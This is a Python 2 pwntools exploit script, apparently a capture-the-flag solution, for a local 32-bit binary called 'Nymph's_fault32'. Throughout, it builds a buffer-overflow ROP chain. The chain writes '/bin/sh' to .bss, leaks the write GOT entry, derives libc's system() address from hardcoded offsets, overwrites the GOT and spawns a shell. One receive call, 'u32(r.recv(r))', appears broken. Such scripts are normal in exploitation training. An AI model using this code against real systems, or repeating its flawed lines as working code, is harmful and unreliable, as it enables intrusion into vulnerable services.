from pwn import *
import time
print("-------------------")
print("---Nymph's Fault---")
print("--pwned by pwnWiz--")
print("-------------------")
print("\n")

context.log_level="debug"

#plt_read = 0x400630
#plt_write = 0x400600

r = process("./Nymph\'s_fault32")
e = ELF("./Nymph\'s_fault32")

plt_read = e.plt['read']
plt_write = e.plt['write']
got_read = e.got['read']
got_write = e.got['write']
bss_addr = 0x804af14
pppr = 0x8048a59

r.recv(1024)
r.sendline("3")
r.recv(1024)

#stack size+sfp
payload="A"*256
payload+="B"*4

#write /bin/sh; to bss_addr(0x602070)
payload+=p32(plt_read)
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(bss_addr)
payload+=p32(len("/bin/sh\0"))

#read plt_write
payload+=p32(plt_write)
payload+=p32(pppr)
payload+=p32(1)
payload+=p32(got_write)
payload+=p32(0x4)

#got overwrite got_write
payload+=p32(plt_read)
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(got_write)
payload+=p32(0x4)

#use plt_write as system()

payload+=p32(plt_write)
payload+="AAAA"
payload+=p32(bss_addr)
#send payload
r.send(payload)
log.info("payload sended!")

#read got_write 
r.recv(0x184)
log.info("parrot detour")

r.sendline("/bin/sh\0")
log.info("/bin/sh sended to bss_addr!")

leak_libc=u32(r.recv(r))
print "leak_libc : " + str(hex(leak_libc))

#offset to system
offset=0xb1f20 #write-system
#offset=0xb1ec0 read-system
#offset=0x9ad50 #libc read-system
system_addr = leak_libc-offset
print "system_addr : " + str(hex(system_addr))

#send system_addr
r.sendline(p32(system_addr))
log.info("system_addr sended!")

#get shell
log.info("shell!! :<")
r.interactive()
